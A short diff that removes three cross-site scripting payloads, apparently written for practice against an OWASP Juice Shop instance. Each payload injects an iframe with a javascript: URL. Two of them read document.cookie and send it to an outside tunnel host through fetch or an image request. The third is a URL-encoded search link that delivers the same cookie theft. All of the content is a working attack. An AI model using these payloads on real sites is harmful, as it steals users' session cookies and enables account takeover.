@@ -1,6 +1,0 @@
-<iframe src="javascript:var i=' ' + document.cookie; alert(i); fetch('http://pip3lee101-64604.portmap.host:64604/?sam')">
-
-
-<iframe src="javascript:let i=new Image;i.src='http://pip3lee101-64604.portmap.host:64604/?lee101'+document.cookie; console.log(document.cookie);" >
-
-    https://pip3lee101-juiceshop.herokuapp.com/#/search?q=%3Ciframe%20src%3D%22javascript:let%20i%3Dnew%20Image;i.src%3D'http:%2F%2Fpip3lee101-64604.portmap.host:64604%2F%3Flee101'%2Bdocument.cookie;%20console.log(document.cookie);%22%20%3E
